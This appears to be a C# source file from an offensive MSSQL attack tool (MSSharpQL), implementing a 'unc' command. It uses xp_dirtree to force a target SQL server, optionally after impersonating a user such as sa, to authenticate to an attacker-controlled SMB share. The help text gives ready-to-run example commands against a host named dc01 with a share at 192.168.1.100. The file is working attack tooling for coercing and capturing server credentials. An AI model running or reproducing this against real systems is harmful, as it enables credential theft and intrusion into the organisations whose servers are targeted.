using System;
using System.Collections.Generic;

namespace MSSharpQL.CommandArgs
{
    public class InjectUNC : ICommand
    {
        public static string CommandName => "unc";

        public void Execute(Dictionary<string, string> arguments)
        {
            string sqlServer = "";
            string database = "master";
            string shareIP = "";
            string shareDir = "";
            string userToImpersonate = "";
            bool help = false;
            string helpInfo = @"[*] UNC Path Injection Authentication

Makes use of the xp_dirtree command to force the MSSQL to authenticate to a remote SMB share.

[*] Arguments:

    [+] /server:        MSSQL Server to connection (hostname or IP)
    [+] /db:            MSSQL Database to use (Default: master)
    [+] /impersonate:   Impersonate database user before executing xp_dirtree
    [+] /shareip:       IP address of the remote SMB share
    [+] /sharedir:      Directory path of the remote SMB share (Default: share)
    [+] /help           Display help info

[*] Examples:

    [+] Connect to DC01 & force authentication to remote SMB share at \\192.168.1.100\documents
        MSSharpQL.exe unc /server:dc01 /shareip:192.168.1.100 /sharedir:documents

    [+] Connect to DC01, Impersonate sa user, & force authentication to remote SMB share at \\192.168.1.100\share
        MSSharpQL.exe unc /server:dc01 /shareip:192.168.1.100
";

            if (arguments.ContainsKey("/server"))
            {
                sqlServer = arguments["/server"];
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/shareip"))
            {
                shareIP = arguments["/shareip"];
            }
            if (arguments.ContainsKey("/sharedir"))
            {
                shareDir = arguments["/sharedir"];
            }
            if (arguments.ContainsKey("/impersonate"))
            {
                userToImpersonate = arguments["/impersonate"];
            }
            if (arguments.ContainsKey("/help"))
            {
                help = true;
            }

            // Null Arguments Handling

            if (help)
            {
                Console.WriteLine(helpInfo);
                Environment.Exit(0);
            }
            if (string.IsNullOrEmpty(sqlServer))
            {
                Console.WriteLine("[!] Please provide a valid server with the \"/server:\" arugment. Exiting...");
                Environment.Exit(0);
            }
            if (string.IsNullOrEmpty(shareIP))
            {
                Console.WriteLine("[!] Please provide a valid server with the \"/shareip:\" arugment. Exiting...");
                Environment.Exit(0);
            }
            if (string.IsNullOrEmpty(shareDir))
            {
                shareDir = "share";
            }
            Console.WriteLine("[+] Mode: Injecting UNC Path...\n");

            Commands.UNC.InjectUNC(userToImpersonate, shareIP, shareDir, sqlServer, database);
        }
    }
}
